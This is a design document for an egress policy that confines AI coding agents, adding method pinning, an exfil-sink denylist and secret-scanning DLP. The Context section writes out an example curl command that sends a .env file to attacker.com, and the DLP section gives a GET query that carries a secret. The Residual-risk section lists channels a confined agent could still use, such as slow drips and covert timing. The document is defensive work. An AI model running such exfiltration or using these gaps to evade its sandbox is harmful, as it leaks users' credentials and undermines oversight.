# Egress Policy — read-allow / write-deny / DLP (fixes S1)

**Status:** design (no code yet) · **Date:** 2026-07-06 · **Fixes:** REVIEW.md S1 (and hardens S3, S4)

## Context

`proveo` confines AI coding agents behind an egress boundary. REVIEW.md **S1** found the boundary does **not** restrict HTTPS destinations in any mode: the Go MITM (`internal/egressproxy`) runs only the broker + flow recorder — no host/method policy — and forwards to Squid as `CONNECT origin:443`, so Squid's `unsafe_methods` write-pin (cleartext-only) never fires. An in-container agent can `curl -x $HTTPS_PROXY https://attacker.com -d @/app/.env`.

We also want agents to **scrape the web** (docs, sourcing, references). A destination allowlist is either too rigid (breaks unforeseen doc sites) or unmaintainably extensive. So the wrong axis is "which destinations"; the right axis is the **asymmetry between reading and exfiltrating**:

- **Reading** = `GET`, tiny bytes out, large bytes in, reputable host.
- **Exfiltration** = data *out* — a `POST` body, a fat query string, or a stream to an attacker sink.

**Design bias: allow inbound (reads) broadly; constrain outbound (method, volume, content) tightly** — a data-diode posture. All of this is enforceable in the MITM, which already decrypts TLS and sees method + URL + headers + body, and composes with the broker as a second `martian` `RequestModifier`.

## Goals / non-goals

**Goals:** (1) close the HTTPS write-exfil hole; (2) keep `GET`-based doc scraping broadly usable with no per-site config; (3) protect the user's credentials regardless of destination; (4) fail closed with clear, logged block reasons; (5) reuse existing plumbing (provider registry, flow log, feed-refresh scripts).

**Non-goals:** a hermetic seal. With a shell the agent can still drip-exfil a few bytes slowly to a non-flagged host, use timing/covert channels, or hide data in otherwise-legit requests. The goal is to turn "trivially exfiltrate a 9 KB `.env`" into "exfiltrate a few bytes, slowly, off-list, on the record." DNS tunneling is already closed (DNS blackhole).

## The three layers (all in the MITM, off-provider only)

Enforced by a new `policyModifier` in `internal/egressproxy`, running **after** the broker so the broker's own injection on the provider host is never mis-flagged. On the pinned-provider host the broker injects and policy is a no-op; everything below applies to **off-provider** requests.

### A. Method pin (read-allow / write-deny)
- `GET`, `HEAD`, `OPTIONS` → allowed to any non-denied host (this is scraping).
- `POST`, `PUT`, `PATCH`, `DELETE` → allowed **only** to the **write-allowlist** (resolved provider hosts + `PROVEO_EGRESS_PROVIDER_DOMAINS` + user additions). Everything else → **block**.
- This is the intended `unsafe_methods` behavior, moved to where the method is actually visible. Some legit reads are `POST` (GraphQL/search) → handled by adding those hosts to the write-allowlist.

### B. Exfil-sink denylist (all methods)
- Hard-deny a curated, category-based list of endpoints that exist to *receive* exfil, so even a `GET` to `webhook.site` is blocked:
  `paste` (pastebin, hastebin, ix.io…), `webhook` (webhook.site, requestbin, pipedream), `tunnel` (ngrok, localtunnel, cloudflared/trycloudflare, serveo), `chat-webhook` (Discord/Slack/Telegram bot/webhook endpoints), `doh` (DoH resolvers — tunneling), `shortener` (bit.ly…), `rawpaste` (raw gist).
- Shipped as an **embedded static list** (`internal/egress/exfil-sinks.txt`, `//go:embed`), refreshable by a script alongside the existing `defs/sidecars/squid-proxy/update-firehol-ipsets.sh` / `update-provider-allow.sh`.
- Optional add-on: a reputation/freshness gate (deny non-top-N or newly-registered domains) — deferred; noted as a future layer D.

### C. Outbound DLP + volume budget (off-provider)
- **Secret scan** of the outbound **URL (path+query) and body**:
  - the user's *own* detected provider secrets (values resolved via the `provider` registry / `KeyVars`, passed in like `broker.env`),
  - generic secret shapes (`sk-…`, `AKIA…`, `ghp_…`, `xox[baprs]-…`, PEM headers) and a high-entropy heuristic (Shannon entropy over long tokens).
  → **block** (default) or redact. This closes the `GET https://evil/?d=<secret>` channel A misses, and directly mitigates S4 (a key read from a mounted `.env`).
- **Volume budget:** cap cumulative outbound bytes (request URL + body) to non-allowlisted hosts per run (default `8k`). Makes bulk exfil impossible even to an allowed host; normal request headers/small queries pass.

## Enforcement, composition, failure mode

- **Order:** `brokerModifier` → `policyModifier`. Provider host: broker injects, policy skips (so the injected key is never DLP-flagged). Off-provider: broker strips cred headers (existing), then policy applies A/B/C.
- **Fail closed:** martian v3.3.3 treats a request-modifier **error as non-fatal** (it logs and still round-trips), so a block is enforced by `ctx.SkipRoundTrip()` (the upstream is never contacted — the actual guarantee) **plus** hijacking the connection to return a `403`. `CONNECT` is allowed past the sink-deny so the MITM decrypts and the *inner* request carries the real method/URL/body for enforcement. A structured block record (`decision: blocked`, reason, host, method) is written to the flow log — never the secret (mirror `recorder.go:71`). Verified live by `internal/egress` `TestFirewallPolicyIntegration`.
- **Mode coverage:** A/B/C require decryption → **firewall** only. In `proxy` mode only SNI/CONNECT-host is visible, so only a host-level deny (B) is possible there. → This plan assumes S7 (make firewall the default) lands with it; `proxy` mode gets B-at-SNI as best-effort.
- **Squid stays** as cleartext (port 80) + private-range defense-in-depth; the MITM becomes the authoritative HTTPS policy point.

## Config

Embedded **default policy** (sinks denied, write-allowlist = resolved providers, DLP on, `8k` budget), overridable via `--egress-policy <file>` / `PROVEO_EGRESS_POLICY` and env knobs. The write-allowlist auto-includes provider hosts from the registry (reuse `provider.ACLBody`) + `PROVEO_EGRESS_PROVIDER_DOMAINS`.

```yaml
egress:
  read:  { default: allow, deny-categories: [paste, webhook, tunnel, chat-webhook, doh, shortener] }
  write: { allowlist: [<resolved-providers>, api.github.com, docs.internal] }
  dlp:   { block-known-secrets: true, block-entropy: true, max-outbound-bytes-per-host: 8k, on-hit: block }
```

Plumbing mirrors the broker: `cmd/proveo` renders the policy (+ resolved provider hosts/secrets for DLP) into the proxy sidecar via a mounted file / env; `cmd/proveo-egress` parses it into `egressproxy.Config.Policy`; `build()` attaches `policyModifier` when policy is active.

## Files

- **New:** `internal/egresspolicy/` (pure, stdlib-only, table-testable like `broker`): `Policy` type + `Decide(req) (Decision, reason)`; secret scanner; byte-budget accounting. `internal/egress/exfil-sinks.txt` (embedded) + a refresh script.
- **Changed:** `internal/egressproxy/proxy.go` (`Config.Policy`, attach `policyModifier` in `build()`); `internal/egressproxy/recorder.go` (log block decisions); `cmd/proveo-egress/main.go` (parse policy config); `cmd/proveo/main.go` (render policy + provider secrets to the proxy; tie into the S7 default-mode change); `internal/egress/plan.go` (mount/env the policy file).

## Test matrix (Layer-1 unit, `egresspolicy` pure)

- `GET` off-provider, non-sink → **allow**; `GET` to `webhook.site` → **block (sink)**.
- `POST` off-allowlist → **block (write)**; `POST` to a write-allowlisted host → **allow**.
- `GET …/?key=<user's ANTHROPIC_API_KEY>` → **block (secret)**; body containing a detected key → **block**.
- `POST` to the **provider host** carrying the broker-injected key → **allow** (DLP skipped on-provider).
- Cumulative outbound > budget to a non-allowlisted host → **block (budget)**; under budget → allow.
- High-entropy blob in query → block (entropy); ordinary prose query → allow.
- Integration (Layer-3, `PROVEO_EGRESS_INTEGRATION=1`): real firewall topology — a `GET https://example.com` succeeds; a `POST https://example.com -d @secret` is refused and logged.

## Residual risk (state plainly in docs)
Slow sub-budget drip to an attacker's own domain, timing/covert channels, and steganography in legit requests survive. This is risk reduction with usable reads, not containment. Pair with the audit log and treat firewall as the default.

## Phasing
1. `internal/egresspolicy` pure core + unit tests (A + B + C decisions). No wiring.
2. Attach `policyModifier` in `egressproxy.build()`; block logging in recorder; integration test.
3. Config plumbing through `cmd/proveo` + `cmd/proveo-egress`; embedded default + file override; land with S7 (firewall default).
4. Sink-list refresh script; optional layer D (reputation/freshness).
